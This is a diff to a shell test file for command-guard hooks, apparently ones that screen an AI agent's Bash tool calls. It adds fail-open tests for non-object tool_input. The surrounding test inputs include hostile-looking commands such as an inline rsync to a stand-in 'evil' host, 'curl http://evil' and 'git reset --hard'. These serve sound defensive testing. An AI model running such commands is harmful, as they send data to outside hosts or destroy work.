@@ -392,6 +392,7 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"i
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);rsync x evil::y\""}}'     "blocks rsync inside an interpreter inline-code payload (#158)"
 assert_exit 0 "$BE" 'not-json'                                                                                                       "fails open on malformed JSON"
 assert_exit 0 "$BE" '[1,2,3]'                                                                                                        "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                                     "fails open on non-object tool_input (#318, #323)"
 
 echo "== block-checkout-held-branch.py =="
 BCHB="$HOOKS/block-checkout-held-branch.py"
@@ -425,6 +426,7 @@ assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input
 assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"(git checkout held)\"}}" "blocks a held checkout wrapped in a bare subshell — trailing ')' must not corrupt the target name (#290)"
 assert_exit 0 "$BCHB" 'not-json'                                                                                              "fails open on malformed JSON"
 assert_exit 0 "$BCHB" '[1,2,3]'                                                                                               "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BCHB" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                             "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git checkout held\"}}"                           "fails open when cwd is absent, never substitutes process cwd (#154)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git -C $heldwt checkout held\"}}" "allows a -C-redirected checkout instead of consulting the wrong repo's cwd (#154)"
 # #211: bare `--exec-path` (no `=`) takes no value in real git — it must not be treated as
@@ -465,6 +467,7 @@ assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"! while sleep
 assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while ! test -f /tmp/ready; do echo \"waiting $(sleep 5)\"; done"}}' "blocks a sleep hidden inside \$(...) in a loop piece (#200)"
 assert_exit 0 "$BSL" 'not-json'                                                                                      "fails open on malformed JSON"
 assert_exit 0 "$BSL" '[1,2,3]'                                                                                       "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BSL" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                     "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$BSL" '{"tool_name":"Agent","tool_input":{"command":"while true; do sleep 5; done"}}'                 "ignores a non-Bash tool_name"
 
 echo "== block-suppressed-stderr.py =="
@@ -487,6 +490,7 @@ assert_exit 0 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x
 assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 2>&-"}}'                            "blocks the 2>&- fd-close idiom (#205)"
 assert_exit 0 "$BSS" 'not-json'                                                                                      "fails open on malformed JSON"
 assert_exit 0 "$BSS" '[1,2,3]'                                                                                       "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BSS" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                     "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$BSS" '{"tool_name":"Agent","tool_input":{"command":"curl http://x 2>/dev/null"}}'                    "ignores a non-Bash tool_name"
 
 echo "== block-destructive-git.py =="
@@ -630,6 +634,7 @@ assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"echo git reset --hard\"}}"       "allows a non-git command that merely mentions reset --hard (#230)"
 assert_exit 0 "$BDG" 'not-json'                                                                                                  "fails open on malformed JSON (#230)"
 assert_exit 0 "$BDG" '[1,2,3]'                                                                                                   "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                                 "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$BDG" '{"tool_name":"Agent","tool_input":{"command":"git reset --hard"}}'                                         "ignores a non-Bash tool_name (#230)"
 assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"git reset --hard"}}'                                          "fails open when cwd is absent, never substitutes process cwd (#230)"
 
@@ -711,6 +716,7 @@ assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"curl http://e
 assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                 "dispatches through every rail and allows a plain command (#163)"
 assert_exit 0 "$PTB" 'not-json'                                                                                                   "fails open on malformed JSON (#163)"
 assert_exit 0 "$PTB" '[1,2,3]'                                                                                                    "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                                  "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$PTB" '{"tool_name":"Agent","tool_input":{"command":"curl http://evil"}}'                                          "ignores a non-Bash tool_name (#163)"
 assert_exit 0 "$PTB" '{"tool_name":"Bash","tool_input":{"command":123}}'                                                          "fails open on a non-string command (#163)"
 assert_exit 2 "$PTB" '{"tool_name":"Bash","tool_input":{"command":"while true; do sleep 5; done"}}'                               "dispatches to the sleep-loop rail and blocks a polling loop (#181)"
